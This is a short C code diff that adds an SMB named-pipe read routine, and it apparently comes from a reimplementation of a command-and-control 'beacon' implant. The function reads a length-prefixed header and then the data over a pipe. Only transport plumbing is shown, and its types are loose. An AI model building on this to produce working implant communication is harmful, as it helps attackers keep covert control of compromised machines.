@@ -1,6 +1,10 @@
 #include "pch.h"
 
+#include "protocol.h"
+
 #include "beacon.h"
+
+
 
 HANDLE ProtocolSmbPipeRead(HANDLE channel, char* buffer, int length)
 {
@@ -50,5 +54,21 @@ char* ProtocolHeaderGet(char* setting, int headerSize, int* pHeaderLength)
 	char* header = BeaconDataPtr(&parser, headerLength);
 	*(int*)(header + *pHeaderLength - sizeof(int)) = headerSize;
 	return header;
-
 }
+
+HANDLE ProtocolSmbRead(PROTOCOL* protocol, char* buffer, int length)
+{
+	int headerSize;
+	char* header = ProtocolHeaderGet(buffer, 0, &headerSize);
+	int totalHeaderRead = ProtocolSmbPipeRead(protocol->channel.handle, header, headerSize);
+	if (totalHeaderRead == -1 || totalHeaderRead != headerSize)
+		return -1;
+
+	int dataSize = *(int*)(header + headerSize - sizeof(int));
+	if ( dataSize < 0 || dataSize > length)
+		return -1;
+
+	return ProtocolSmbPipeRead(protocol->channel.handle, buffer, dataSize);
+}
+
+
